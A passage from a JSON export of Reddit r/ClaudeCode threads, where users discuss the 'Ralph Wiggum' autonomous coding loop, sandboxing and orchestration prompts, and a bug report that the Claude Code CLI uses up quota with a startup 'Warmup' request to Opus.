          "id": "nzfstwv",
          "author": "sephiroth_9999",
          "text": "There is no way I am letting a script named after Ralph Wiggum code any of my projects.",
          "score": 3,
          "created_utc": "2026-01-13 22:51:40",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzi5u2s",
              "author": "box_of_hornets",
              "text": "Has anyone actually explained why it's called that?",
              "score": 1,
              "created_utc": "2026-01-14 07:55:34",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzlilu3",
                  "author": "92smola",
                  "text": "Cause its stupid simple",
                  "score": 1,
                  "created_utc": "2026-01-14 19:47:24",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nzfk8zs",
          "author": "deepthinklabs_ai",
          "text": "Itâ€™s a fascinating idea, though I commonly need to provide my input on design decisions for security, structure, UI purposes. I like the concept, but in practice - itâ€™s highly possible that you end up with something very different from what you imagined that you are going to have to redo anyways. I would prefer to be in the loop at the expense of my time. What I WOULD like is a way for Claude Code to notify me on my phone when it is waiting for a response from me. Anyone making that??",
          "score": 3,
          "created_utc": "2026-01-13 22:09:21",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzfootr",
              "author": "Leather-Curve-5090",
              "text": "You could set up a vps code server on virtual studio code and connect on a url from anywhere, its a little clunky but does the job",
              "score": 2,
              "created_utc": "2026-01-13 22:30:52",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nzfpg3d",
              "author": "HaxleRose",
              "text": "I think the thing that youâ€™re missing is all those decisions should be made before starting the Ralph loop. Time should be invested in building thorough specification files. That way it has all the answers before it starts building.",
              "score": 2,
              "created_utc": "2026-01-13 22:34:38",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzfwbf2",
                  "author": "deepthinklabs_ai",
                  "text": "Thatâ€™s true and a good point. I guess with my own projects, I commonly realize that I donâ€™t know what I donâ€™t know yet.",
                  "score": 2,
                  "created_utc": "2026-01-13 23:09:53",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzfset9",
              "author": "Low_Opening428",
              "text": "Chell on the App Store, does exactly that for free",
              "score": 2,
              "created_utc": "2026-01-13 22:49:33",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzfwe0p",
                  "author": "deepthinklabs_ai",
                  "text": "Thanks!",
                  "score": 1,
                  "created_utc": "2026-01-13 23:10:16",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzlj5a7",
              "author": "92smola",
              "text": "Happy dev app, you can fully control claude running on your pc or laptop from your phone. On the ralph loop side I love it, there are tasks I will give my custom runner to, and task that I work on as the human in the loop.",
              "score": 1,
              "created_utc": "2026-01-14 19:49:49",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nzfktxc",
          "author": "Ok_Grapefruit7971",
          "text": "Question about sandboxing - why not just give Claude permissions, and set it up in a git worktree? That way it's work is isolated in it's own worktree?",
          "score": 3,
          "created_utc": "2026-01-13 22:12:08",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzfqdxk",
              "author": "Altruistic_Ad8462",
              "text": "A sandbox is essentially a container. Let's say Claude decides to add some lib you don't want or need, that's isolation to the container vs the entire system. Let's say Claude decides he wants to nuke your DB? It does it in an isolated dev environment where if it blows shit up, you don't cry. Money lost is better than money and time lost.",
              "score": 4,
              "created_utc": "2026-01-13 22:39:20",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nzfrpht",
          "author": "crazyneverst",
          "text": "What are you guys using as sandbox? Just local docker? Any special confirmation? Example to link?",
          "score": 3,
          "created_utc": "2026-01-13 22:45:59",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzi2p26",
              "author": "do_not_give_upvote",
              "text": "A bit overkill, but this is what I came up with. Might not be working for you as I kinda have slightly different flow now. But the idea is still the same. Create a Docker image with pre-build dev environment needed for all of my projects, eg Ruby, Go, Ansible, rg, fzf. You get the idea. \n\nWhat I do is \\`rize claude\\` and it will mount my local current project into Docker container, and I just run everything there. Main goal is for docker to have similar env as my local, so that it can run whatever.\n\n[https://github.com/alienxp03/rize/blob/master/rize#L13](https://github.com/alienxp03/rize/blob/master/rize#L13)",
              "score": 1,
              "created_utc": "2026-01-14 07:26:21",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nzg34bs",
          "author": "belheaven",
          "text": "This is overrated. You dont need this. Automation does not work quite yet. You have to work, trust me bro",
          "score": 5,
          "created_utc": "2026-01-13 23:46:18",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzft3tr",
          "author": "ripper999",
          "text": "Sounds like a video I just watched but he provided the files to make it work, Chase AI on YouTube",
          "score": 2,
          "created_utc": "2026-01-13 22:53:05",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o05gyyi",
          "author": "RandomBarry",
          "text": "this was the guide I was looking for up and running now. Brilliant stuff.",
          "score": 2,
          "created_utc": "2026-01-17 18:48:57",
          "is_submitter": false,
          "replies": [
            {
              "id": "o07f804",
              "author": "trynagrub",
              "text": "Happy to help!",
              "score": 1,
              "created_utc": "2026-01-18 00:44:15",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "nzfjgxt",
          "author": "trynagrub",
          "text": "Youtube Walkthrough: [https://youtu.be/eAtvoGlpeRU](https://youtu.be/eAtvoGlpeRU)  \nGithub Guide: [https://github.com/JeredBlu/guides/blob/main/Ralph\\_Wiggum\\_Guide.md](https://github.com/JeredBlu/guides/blob/main/Ralph_Wiggum_Guide.md)",
          "score": 4,
          "created_utc": "2026-01-13 22:05:41",
          "is_submitter": true,
          "replies": []
        },
        {
          "id": "nzfsesy",
          "author": "bzBetty",
          "text": "still waiting on a major agent/harness to pickup on some workflow automation.\n\nneeds to be a claude code feature not a plugin so that it can loop properly and do things like create worktrees.\n\n  \ni suspect it could use a subagent to almost do it though, but i don't think claude code can switch its directory while its running",
          "score": 1,
          "created_utc": "2026-01-13 22:49:33",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzfuh6n",
          "author": "crystalpeaks25",
          "text": "I mean pretty much the claude plugin only cares about the outer loop.\n\n1. You can use a main orchestrator to orchestrate multiple subagents that runs the claude plugin outer loop. This way you can run in different context windows focused on a specific task.\n2. You can tell each suabagent to work on actinable fleshed out tasks and make the go into plan mode automatically and exist plan mode automatically on their own before implementing the task.\n\nYes the claude plugin is flexible and according to geoff its too too flexible that people will misuse it and have a negative experience with it and not use ralph loop anymore when in fact if you have a plan phase + impleemntaiton phase as part of the loop which isnt really enforced by the claude plugin buyt enforced in the original ralph shell script then you will have consistent successful result.\n\nIts not a question on shell vs plugin its about how they are both implemented. the problem is claude plugin is too flexible that also means you can build on top of it and the ralph loop can be used for more than just coding.\n\nI also believe that in reality, given a fleshed out, comprehensive and actionable task ralph loop is unecessary based on my experience. give it a oneliner task it will go multiple iterations. give it a comrpehensive actionable task with success criteria usually done in one iteration.",
          "score": 1,
          "created_utc": "2026-01-13 23:00:08",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzfy38b",
          "author": "allhailzod",
          "text": "Sage",
          "score": 1,
          "created_utc": "2026-01-13 23:19:16",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzfyxgd",
          "author": "Kyan1te",
          "text": "Anyone else that is an actual software engineer feel like they'd rather save the tokens & just point Claude in the right direction with a solid enough up front spec or after the first loop?Â ",
          "score": 1,
          "created_utc": "2026-01-13 23:23:45",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzg4fn6",
          "author": "tossaway109202",
          "text": "My struggle is with my workflow it keeps finishing things in 1 shot, so it's not much helpÂ ",
          "score": 1,
          "created_utc": "2026-01-13 23:53:21",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzg9m2o",
          "author": "HealthyCommunicat",
          "text": "lets be brutally honest. 90% of people saying ralph loop doesnt work for them dont even have the bare basic agentic coding knowledge. these people hear about some magic new plugin and go for it hoping it solves all their problems when they arent even aware of that idea that they can write .md files for better structure and rules, 99% of the time someone says an llm or an llm extension isnt working is because they refuse to go out of their way to actually learn. this is the only tool in the world where if you don't know how to use it, you can ask the tool itself how it should be used - yet llm's are revealing just how vast the majority of human beings literally dont know how to articulate words or even learn something new or follow simple instructions. ive clarified what an mcp server is to my boss too many times to count over the past year, and literally just today he literally didn't have one single basis of understanding to even begin understanding what an mcp is - even when its been explained multiple times a week and he uses stuff like claude code on the daily. this is just what the average human is like. \n\n  \nif you have an actual proper structured goal and know what it is exactly the outcome of the llm's work should be in the first place, and can properly articulate that to the llm, there is literally nothing you can't make. you don't even need to know any coding or tech jargon. my girlfriend who literally knows nothing about coding was able to use ralph loop properly last week to make a nail ecommerce shop.",
          "score": 1,
          "created_utc": "2026-01-14 00:21:11",
          "is_submitter": false,
          "replies": [
            {
              "id": "o03rkqy",
              "author": "RemarkableGuidance44",
              "text": "I love it anyone can make anything, which also means the value of any application or SaaS product is worth nothing. What a time to be alive, when my 6 year old can build Discord in a day with some little help from me.",
              "score": 2,
              "created_utc": "2026-01-17 13:50:11",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o09k9mg",
                  "author": "HealthyCommunicat",
                  "text": "I feel this so harshly. LLMâ€™s have raised accessibility to creating websites and sofrware by a fuck ton, but it massively devalues people like me who work specifically in LLMs to the general public. Now when I tell someone general that I work in AI they end up thinking I just talk to ChatGPT not even realizing that there are models out there that can even be downloaded and run on machines we own.",
                  "score": 1,
                  "created_utc": "2026-01-18 09:33:44",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzy8n1c",
              "author": "Intelligent_Tone_310",
              "text": "not only that, also the fact that the agent needs a consistent way to test results against spec expectations. This is the way the agent knows if it needs to keep iterating or not",
              "score": 1,
              "created_utc": "2026-01-16 16:58:55",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzy8yfm",
                  "author": "HealthyCommunicat",
                  "text": "even before playwright came out i had to setup puppeeteer to have it check the website as soon as finished done editing so that i can ensure the edit was done correctly. you are right in a sense in that its just a lack of overall knowledge in many ways",
                  "score": 1,
                  "created_utc": "2026-01-16 17:00:19",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nzgbdpu",
          "author": "TuffTirk3y",
          "text": "Bmad + Ralph-loop + TDD - Ralph-Loop exit criteriaâ€¦ \n\nThe YouTube video comes out from the creator of Ralph loop and everyone is a day 1 expert now..",
          "score": 1,
          "created_utc": "2026-01-14 00:30:49",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzguhsr",
          "author": "ShelZuuz",
          "text": "I've seen a LOT of Ralph Wiggum videos and I've literally not seen one video or post where someone advocates for running the Claude Code version of it. I've seen video after video and post after post though of how \"most people\" are doing it wrong. \n\nWhere exactly are all these \"most people\" who are doing it wrong?",
          "score": 1,
          "created_utc": "2026-01-14 02:18:28",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzgw610",
          "author": "Amazing_Ad9369",
          "text": "It also needs a script to use a fresh context window for every loop. Which the ralph-wiggum plugin doesnt have",
          "score": 1,
          "created_utc": "2026-01-14 02:27:53",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzh9kl1",
          "author": "do_not_give_upvote",
          "text": "Is there a better way to run the command?\n\n\\- \\``claude -p $PROMPT` works, but this will only print the response. I can't stream what it's doing live.\n\nIdeally I want to use \\``echo $PROMPT | claude`\\` instead, because it will open the TUI and I can see the whole flow while it's running. But problem with this approach is that it will just stop and won't exit the TUI once it's done, and might need to watch for other responses too, eg rate limit.\n\nAny ideas?",
          "score": 1,
          "created_utc": "2026-01-14 03:45:46",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzhvjyr",
          "author": "Zerve",
          "text": "It might not be \"overnight\" but I have been able to consistently get Claude to work on 30m - 4h prompts in \"one shot\" with only things provided out of the box. Mostly this involves providing it a very clear prompt which includes looping and spawning sub agents / sub tasks. You can even tell it to spawn the tasks as Opus / Sonnet / Haiku based on difficulty. A basic simplified example would be:\n\n\n    Optimize this Rust codebase iteratively.\n    \n    LOOP:\n    1. Run: find src -name \"*.rs\" -exec wc -l {} \\; | sort -rn | head -1\n    2. If largest file is under 400 lines: EXIT LOOP, go to FINALIZE\n    3. Spawn a Sonnet agent to split that file (target 200-400 lines per new file)\n    4. Wait for subagent, verify cargo check passes\n    5. GOTO 1\n    \n    FINALIZE:\n    1. Spawn subagent: Create ARCHITECTURE.md for final structure \n    \n    SAFETY:\n    - Stop if same file appears twice (couldn't split it)\n    - Stop on any cargo check failure\n\nYet I've done the same thing with an 18-step+ series of prompt files and given a similar prompt of saying \"step thru these one by one and pass them directly to the sub agent as is.\" Include a validation step in between each step (failure go to beginning, pass continue). You can get pretty complex with this as long as the orchestration loop itself is quite simple, keeping context clean and focused and even running 3-10 parallel tasks if possible in waves.\n\nMaybe this is inferior to other tools, but if CC out of the box gets me 90% of the way there, why add a new tool I have to learn how to use effectively?",
          "score": 1,
          "created_utc": "2026-01-14 06:24:03",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzi564p",
          "author": "East-Present-6347",
          "text": "Soooooo common sense gotcha",
          "score": 1,
          "created_utc": "2026-01-14 07:49:20",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzioxni",
          "author": "Gold_Jury_789",
          "text": "Don't use the plugin, it's completely bugged on my side on my mac and my windows, it doesn't act the way i want it to act so i've created a skill in replacement, works like a charm",
          "score": 1,
          "created_utc": "2026-01-14 10:56:46",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nziubfp",
          "author": "Accomplished-Bird829",
          "text": "Use it with the new GLM4.7 its great model and prices\n https://z.ai/subscribe?ic=ANKNPDRYUR",
          "score": 1,
          "created_utc": "2026-01-14 11:41:38",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzkqv50",
          "author": "Appropriate-Career62",
          "text": "[The Ralph Loop: Why This Claude Code Plugin Is Defining AI Development in 2026](https://namiru.ai/blog/the-ralph-loop-why-this-claude-code-plugin-is-defining-ai-development-in-2026?source=papo-reddit)",
          "score": 1,
          "created_utc": "2026-01-14 17:43:47",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzlxzvf",
          "author": "Current_Classic_7305",
          "text": "People are spending so much time automating Claude Code to work alone, to such a degree that you can't really get any work done. This is such a typical developer mindset. It used to be the same with scripts, I saw developers spending a day on a script to automate something they might do twice a week and manually it would take them five minutes.\n\nFocus on getting the job done, then you'll understand what really needs automation.",
          "score": 1,
          "created_utc": "2026-01-14 20:57:34",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzo3nr0",
          "author": "Mysterious_Feedback9",
          "text": "The anthropic version is targeted to foolish idiots to make them spend bazillion tokens especially in a pay as you go.\n\nThe original bash loop is way better but need thoughtful preparation and also monitoring.",
          "score": 1,
          "created_utc": "2026-01-15 03:51:46",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzp3qpb",
          "author": "HighwaySuccessful247",
          "text": "So true, the bash loop is so much better - used your github guide to run Claude Code in ralph loop and extracted 400+ product frameworks overnight. much easier that i thought, thanks!",
          "score": 1,
          "created_utc": "2026-01-15 08:40:51",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzqvieo",
          "author": "thanakos7",
          "text": "One question: Why or how does the model exit an iteration before hitting the context limit?\n\nLike, the completion promise is tied to the task, not the context limit. And there's nothing in the shell script which indicates that the model should just exit and resume in a new session.",
          "score": 1,
          "created_utc": "2026-01-15 15:51:04",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzv6jss",
              "author": "thanakos7",
              "text": "Found the answer in the bash script. It's the -p flag.",
              "score": 1,
              "created_utc": "2026-01-16 04:48:11",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nzxtupb",
          "author": "Illustrious-Lime-863",
          "text": "Just want to say that you can give CC your guide and it will take care of the setup too lol. It's ralphception",
          "score": 1,
          "created_utc": "2026-01-16 15:53:47",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o04olc5",
          "author": "Primary_Diamond_2411",
          "text": "I created an MCP Server based on it. [https://github.com/cbuntingde/ralph-wiggum-mcp](https://github.com/cbuntingde/ralph-wiggum-mcp)",
          "score": 1,
          "created_utc": "2026-01-17 16:37:26",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzgwe0x",
          "author": "former_physicist",
          "text": "I made a version of this that uses a proper bash loop, task tickets, one ticket per loop, and commits after each ticket is complete.\n\nYou can see it here: [https://github.com/JamesPaynter/efficient-ralph-loop](https://github.com/JamesPaynter/efficient-ralph-loop)",
          "score": 1,
          "created_utc": "2026-01-14 02:29:08",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzfou9c",
          "author": "bratorimatori",
          "text": "I tried it a few days ago. Here is my post on it if someone is curious https://intelligenttools.co/blog/claude-code-unsupervised-8-hours-ralph-loop",
          "score": 0,
          "created_utc": "2026-01-13 22:31:37",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzfo7a8",
          "author": "Heatkiger",
          "text": "Zeroshot is Ralph Wiggum on steroids: https://github.com/covibes/zeroshot",
          "score": -4,
          "created_utc": "2026-01-13 22:28:28",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qazqq6",
      "title": "Confirmed: Claude Code CLI burns ~1-3% of your quota immediately on startup (even with NO prompts)",
      "subreddit": "ClaudeCode",
      "url": "https://www.reddit.com/r/ClaudeCode/comments/1qazqq6/confirmed_claude_code_cli_burns_13_of_your_quota/",
      "author": "JohnGalth",
      "created_utc": "2026-01-12 16:36:50",
      "score": 212,
      "num_comments": 114,
      "upvote_ratio": 0.93,
      "text": "I saw some posts here recently about the new CLI draining usage limits really fast, but honestly I thought people were just burning through tokens without realizing it. I decided to test it myself to be sure.\n\nI'm on the Max 20 plan. I made sure I didn't have an active session open, then I just launched the Claude Code CLI and did absolutely nothing. I didn't type a single prompt. I just let it sit there for a minute.\n\nResult: I lost about 1-3% of my 5h window instantly. Just for opening the app.\n\nIf it's hitting a Max plan like this, I assume it's hurting Pro/Max 5 users way harder.\n\nI got curious and inspected the background network traffic to see what was going on. It turns out the \"initialization\" isn't just a simple handshake.\n\n1. The CLI immediately triggers a request to `v1/messages`.\n2. It defaults to the **Opus 4.5** model (the most expensive one) right from the start.\n3. The payload is massive. Even with no user input, it sends a \"Warmup\" message that includes the **entire JSON schema definition for every single tool** (Bash, Grep, Edit, etc.) plus your entire [`CLAUDE.md`](http://CLAUDE.md) project context.\n\nSo basically, every time you launch the tool, you are forcing a full-context inference call on Opus just to \"warm up\" the session.\n\nI have the logs saved, but just wanted to put this out there. It explains the \"startup tax\" we're seeing. Hopefully the Anthropic team can optimize this routine (maybe use Haiku for the handshake?) because burning quota just to initialize the shell feels like a bug.",
      "is_original_content": false,
      "link_flair_text": "Bug Report",
      "permalink": "https://reddit.com/r/ClaudeCode/comments/1qazqq6/confirmed_claude_code_cli_burns_13_of_your_quota/",
      "domain": "self.ClaudeCode",
      "is_self": true,
      "comments": [
        {
          "id": "nz787ib",
          "author": "Aggressive-Pea4775",
          "text": "Genuinely believe this is a versioning issue, nothing to do with models or CC itself.\n\n2.1.5 is busted IMHO - which is where your test falls down.\n\n2.0.76 (as I was looking at this) has been 60-70% less wasteful in tool calls and token usage. It just gets it done.\n\nGive it a go - youâ€™ll see what I mean.",
          "score": 29,
          "created_utc": "2026-01-12 17:55:11",
          "is_submitter": false,
          "replies": [
            {
              "id": "nz7cd4p",
              "author": "tomchenorg",
              "text": "By 2.1.15, you mean 2.1.5 right?\n\nv2.1.5 was released 20 hours ago, Claude's developer [said](https://github.com/anthropics/claude-code/issues/16157#issuecomment-3737070631) they were fixing it 11 hours ago",
              "score": 4,
              "created_utc": "2026-01-12 18:13:54",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nz7cpkn",
                  "author": "Aggressive-Pea4775",
                  "text": "Fancy me, the human, having too many 1â€™s and 0â€™s ðŸ˜‰\n\nFixed.\n\nAnd yep, chatted with Boris earlier - hopefully a fix on the way soon!",
                  "score": 4,
                  "created_utc": "2026-01-12 18:15:29",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nz7bufm",
              "author": "JohnGalth",
              "text": "Thatâ€™s an interesting data point. If `2.0.76` doesn't trigger this specific `v1/messages` \"Warmup\" call on startup, then this is definitely a regression introduced in the newer versions.\n\nHowever, just to be clear: I'm not talking about it being wasteful *during* a task (like getting stuck in loops or bad tool calls). I'm talking about the hard-coded startup sequence.\n\nDoes `2.0.76` skip that initial Opus inference call entirely? If so, that confirms they broke the initialization logic in `2.1.x`.",
              "score": 4,
              "created_utc": "2026-01-12 18:11:34",
              "is_submitter": true,
              "replies": [
                {
                  "id": "nz7cfqa",
                  "author": "Aggressive-Pea4775",
                  "text": "Hard to know 100% but they patched 2.1.0 quickly with 2.1.1 which was ok-ish on the weekend but nowhere near 2.0.76.\n\n2.1.5 horrid, tried 2.1.1 still shocking, but got all my productivity back with the downgrade to 2.0.76.\n\nAgree with your assertion, and I know correlation doesnâ€™t equal causation but Iâ€™d put some money on your take being true.",
                  "score": 3,
                  "created_utc": "2026-01-12 18:14:14",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "nz7eooo",
                  "author": "tomchenorg",
                  "text": "\"This is a feature, not a bug!\" ðŸ˜„\n\nIndeed, those warmup messages seem to be intended for caching and later reuse, which would save tokens. However, they send the warmup messages eagerly instead of lazily, they are sent at startup, instead of when the user sends their first message, or more precisely, the first message that actually requires those warmup messages.",
                  "score": 5,
                  "created_utc": "2026-01-12 18:24:25",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nz6wpbg",
          "author": "drumnation",
          "text": "People seem confused about what you are saying. If you want to chain sessions together there are a few different ways. Clear and handoff or kill the instance start a fresh instanceâ€¦ OP is saying if you kill and start fresh you incur a token penalty during startup every single time. If you extend that to many many handoffs you can see that getting out of control.",
          "score": 20,
          "created_utc": "2026-01-12 17:02:39",
          "is_submitter": false,
          "replies": [
            {
              "id": "nz6x9q3",
              "author": "JohnGalth",
              "text": "Spot on. That is exactly the point.\n\nIt creates an invisible \"overhead cost\" for every new session. If you work in a way where you open fresh instances often (which is a very common workflow for developers), you are effectively paying a premium just for that workflow style, regardless of the complexity of your actual prompts.",
              "score": 7,
              "created_utc": "2026-01-12 17:05:17",
              "is_submitter": true,
              "replies": [
                {
                  "id": "nz71lqm",
                  "author": "Historical-Lie9697",
                  "text": "I think that's why the disable all background processes variable was just added as an option. There is a ridiculous amount of haikus running around in the background for things like prompt hints, checking available plugins, etc. Feels like its basically an unprompted explore agent on every session start. So I disable all that stuff. Plus now even with auto compact off you've got conversation compaction going on in the background which is nice but also eats up tokens",
                  "score": 4,
                  "created_utc": "2026-01-12 17:25:13",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "nzbr5ix",
                  "author": "Brandroid-Loom99",
                  "text": "It really doesn't though.  If you know how these things work, caching is the only way it's possible to do in a sane way.  You are sending your entire context with every single message regardless.  That's just a fact.  So you really aren't paying any tax for the opening of the session.  \n\nThere is a tax, but it's really for opening a session and letting it sit there without using it.  I agree it sucks and as soon as I get my claude back, I'm going to write a proxy to block this crap anyway :)",
                  "score": 2,
                  "created_utc": "2026-01-13 09:41:10",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzg3cmj",
              "author": "adelie42",
              "text": "It isn't an arbitrary penalty. It has to consume the system prompt which is sent quietly before the first user prompt.",
              "score": 1,
              "created_utc": "2026-01-13 23:47:33",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nz79w0h",
          "author": "TheXIIILightning",
          "text": ">plus your entire [`CLAUDE.md`](http://CLAUDE.md) project context.\n\nThis one is shocking for me, because unless I remind Claude Code to read that file or .claude, it'll just blatantly ignore every written rule and reference directory and start doing its own thing.\n\nWhat's even the point of loading all that info before there's any interaction..",
          "score": 8,
          "created_utc": "2026-01-12 18:02:43",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzbs3o9",
              "author": "Brandroid-Loom99",
              "text": "You do know that all of the context is sent with every request, right?  LLMs are stateless, there is no 'up front'.  You have one big chunk of text that gets processed more or less at the same time, then you get tokens back.  Everything else is just an illusion built on top of that.\n\nThe reason this is important is because there is no such thing as \"it's not sending my CLAUDE.md\".  Yes it is, it's sending it with every single message.  That is fundamental to the technology.  \n\nI'm not saying it's not ignoring it, what I'm saying is that the reason is somewhere else besides \"it never got it\".  Are you saying \"You must always use 2 space indent, NEVER tabs\" and it ignores that?  Or \"You must use the correct formatting style and best practices\" and it ignores that?",
              "score": 2,
              "created_utc": "2026-01-13 09:50:21",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nz79c8m",
          "author": "buyurgan",
          "text": "what is going on here.. people clearly doesn't get the point.  \nif its true (which i hardly can believe it is, but I expect bad practices or bugs), this is clearly very problematic behavior for both Anthropic and customers. if you open 100 instances of a claude code and do nothing and kill the processes after 10 seconds, you basically spending tokens on nothing.  \na proper tool should only handshake, Oauth, check updates, server status, analytics etc etc and nothing more, until user enters a prompt. I don't even think otherwise can be considered legal.",
          "score": 12,
          "created_utc": "2026-01-12 18:00:15",
          "is_submitter": false,
          "replies": [
            {
              "id": "nz7cpap",
              "author": "JohnGalth",
              "text": "You hit the nail on the head.\n\nThe \"100 instances\" scenario is the perfect stress test to demonstrate why this logic is broken. If you ran a script right now to open and close the CLI 100 times, you would indeed burn through your quota having produced absolutely zero value (cached hits are cheaper, but not free).\n\nIt seems like an aggressive optimization gone wrongâ€”trying to \"pre-warm\" the context so the first response feels snappyâ€”but they failed to account for the fact that the user is paying a premium for that warmup. It should absolutely be lazy-loaded (wait for prompt -> send context).",
              "score": 4,
              "created_utc": "2026-01-12 18:15:27",
              "is_submitter": true,
              "replies": [
                {
                  "id": "nzanzmm",
                  "author": "drumnation",
                  "text": "TBH, another problem here is claude code doesn't provide a good way to smoothly chain interactive sessions together. All these things we do feel like workarounds. The 100 instances scenario is only even really an issue because you can't have claude clear itself so you have to setup a rube goldberg machine to do that properly.  The other way potentially would be auto-compact with a custom prompt, but there doesn't seem to be a way to set a default custom compaction prompt. Meaning the only way to get that custom behavior is a manual slash command and then you need to be managing claude outside of claude to allow fully autonomous handoffs.\n\nAutocompact is the only way to really autonomously chain sessions together supported by claude code in interactive mode. But it's very wasteful on tokens and starts to blur it's mission after a while.  If you could set your own default compaction prompt you could choose for compaction to function more like a session clear with a short handoff. Sometimes my post-autocompact sessions start at 100k tokens, I'm pretty sure it's just bugged in general. Right now I feel like we're being discouraged from automating the management of the context window more effectively because the lack of tools provided by claude code make it difficult to do that.\n\nThere have been complaints in the forums about autocompact, most of us turn it off or come up with what feels like a bandaid. Out of everything they could fix, fixing compaction would make their entire system so much more efficient for everyone. It should be a feature you customize as the user with your own dedicated rules and you should have a lot of control over the compaction... don't even call it compaction, just make an actual handoff ability within claude, so you can choose if you want claude to garble up your conversation into 100K tokens with compaction or write what's actually necessary to create continuity and bridge a longer session together in 20K tokens. Automate a clear instead of a compact at 50-75% context and have a recover from handoff protocol or lifecycle hook that runs after the auto-clear runs? something that would make it easier to hook the scaffolding layer with all the planning into these handoffs.\n\nBut then you're saying we're paying a big penalty if the method we're using to get around claude code making it hard to automate clean low token handoffs, which would be to automate spawning new terminal sessions running claude code and now we're getting hit with token waste there too? Not to mention anytime you update your claude code configuration you have to restart all your open instances anyway... more penalty. Sorry for the book. I figured if you're running these kinds of experiments you're trying to do some of the same stuff. I hope claude reads this too lol.",
                  "score": 1,
                  "created_utc": "2026-01-13 04:16:05",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "nz7ggd0",
                  "author": "lucianw",
                  "text": "I don't think that's true. I don't believe that cache hits count against your quota. I couldn't find a direct statement on this; the following is the closts I found.\n\n[https://platform.claude.com/docs/en/api/rate-limits](https://platform.claude.com/docs/en/api/rate-limits)  \n\\> **For most Claude models, only uncached input tokens count towards your ITPM rate limits**",
                  "score": -2,
                  "created_utc": "2026-01-12 18:32:21",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzg5dnm",
              "author": "adelie42",
              "text": "The difference between CC and web is that it works the way you say for web, but when you send that first prompt it initialized a new session with the system prompt, then processes the user prompt. This is why the first response is slightly slower. With CC, unless you are resuming a session, starting CC starts a new session on launch consuming the system prompt.\n\nIt's like calling a technician and having them drive to your house only to tell them you don't need anything and wondering why they still charge you a service fee for no service.\n\nAlso worth noting that Claude's system prompt is exceptionally long. It is also one of many things that makes it so good.\n\nNot only does the documentation confirm this, but you get the same thing running a local LLM. Start a new session and see your GPU usage spike. \n\nThink of it like spinning up a new AWS server and doing \"nothing\" with it. You are still expected to pay for the resources of bioting up the OS.",
              "score": 1,
              "created_utc": "2026-01-13 23:58:23",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzglww3",
                  "author": "buyurgan",
                  "text": "interesting points ... i agree most of it but still, we are paying for the token usage ...  \nit this is required, then, it should also clearly be documented, each time claude code is started, it costs 3k token etc. or give an optional argument for cold starting the tool.",
                  "score": 1,
                  "created_utc": "2026-01-14 01:29:47",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzbq4qh",
              "author": "Brandroid-Loom99",
              "text": "> I don't even think otherwise can be considered legal.\n\nI'm actually laughing",
              "score": 0,
              "created_utc": "2026-01-13 09:31:08",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nz7g3k4",
              "author": "lucianw",
